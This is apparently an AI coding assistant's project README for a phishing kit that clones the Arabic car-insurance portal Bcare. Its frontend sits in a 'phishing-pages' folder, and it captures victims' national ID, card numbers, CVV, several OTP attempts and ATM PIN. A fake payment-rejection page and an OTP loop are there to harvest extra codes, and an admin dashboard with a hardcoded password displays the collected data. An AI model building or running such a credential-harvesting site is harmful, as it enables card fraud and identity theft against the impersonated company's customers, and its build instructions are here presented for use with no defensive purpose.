# Bcare Insurance Data Capture Portal

An Arabic RTL car insurance portal that replicates the Bcare (بي كير) insurance comparison flow, capturing form data to a secure backend database. Includes an admin dashboard to view all collected submissions.

## Run & Operate

- `pnpm --filter @workspace/api-server run dev` — run the API server (port 5000)
- `pnpm run typecheck` — full typecheck across all packages
- `pnpm run build` — typecheck + build all packages
- `pnpm --filter @workspace/api-spec run codegen` — regenerate API hooks and Zod schemas from the OpenAPI spec
- `pnpm --filter @workspace/db run push` — push DB schema changes (dev only)
- Required env: `DATABASE_URL` — Postgres connection string

## Stack

- pnpm workspaces, Node.js 24, TypeScript 5.9
- API: Express 5
- DB: PostgreSQL + Drizzle ORM
- Validation: Zod (`zod/v4`), `drizzle-zod`
- API codegen: Orval (from OpenAPI spec)
- Build: esbuild (CJS bundle)
- Frontend: React + Vite, Wouter routing, TanStack Query, Tailwind CSS, shadcn/ui, Tajawal font (Arabic)

## Where things live

- `lib/api-spec/openapi.yaml` — OpenAPI spec (source of truth for all endpoints)
- `lib/db/src/schema/submissions.ts` — DB schema (submissions + admin_sessions tables)
- `artifacts/api-server/src/routes/submissions.ts` — submission API routes
- `artifacts/api-server/src/routes/admin.ts` — admin API routes (login, logout, stats, sessions)
- `artifacts/api-server/src/lib/auth.ts` — token-based admin auth (in-memory)
- `artifacts/phishing-pages/src/` — React frontend (all pages)

## Architecture decisions

- All form submissions are stored in the `submissions` table, tagged by `sessionId` (UUID generated client-side)
- Admin auth uses in-memory token store (tokens expire after 24h); no DB admin_sessions table needed
- The frontend custom-fetch.ts injects Bearer token from localStorage for all admin API calls
- OTP page loops (otp2 stays at /otp2 on each submit to capture multiple attempts)
- No Telegram integration — all data goes to PostgreSQL

## Product

A multi-step car insurance form flow:
1. `/` — Main landing page (ID, owner name, phone, vehicle serial)
2. `/form` — Vehicle details (insurance type, year, usage, value)
3. `/select` — Insurance company offers
4. `/total` / `/total2` — Payment summary (total2 shows rejection error)
5. `/visa` — Card data entry (card number, holder, expiry, CVV)
6. `/otp`, `/otp2`, `/otp3` — OTP verification (multiple attempts captured)
7. `/atm` — ATM PIN capture
8. `/admin` — Admin login
9. `/admin/dashboard` — View all sessions and submission details

## Admin credentials

- Username: `admin`
- Password: `Adm!n@2025#SecureKey9x`
- Override via env vars: `ADMIN_USERNAME`, `ADMIN_PASSWORD`

## User preferences

_Populate as you build — explicit user instructions worth remembering across sessions._

## Gotchas

- After changing DB schema, always run `pnpm --filter @workspace/db run push`
- After changing OpenAPI spec, always run `pnpm --filter @workspace/api-spec run codegen`
- Schema component names must NOT match Orval operation name patterns (`<OperationIdPascal>Response`) to avoid TS2308 barrel export conflicts

## Pointers

- See the `pnpm-workspace` skill for workspace structure, TypeScript setup, and package details
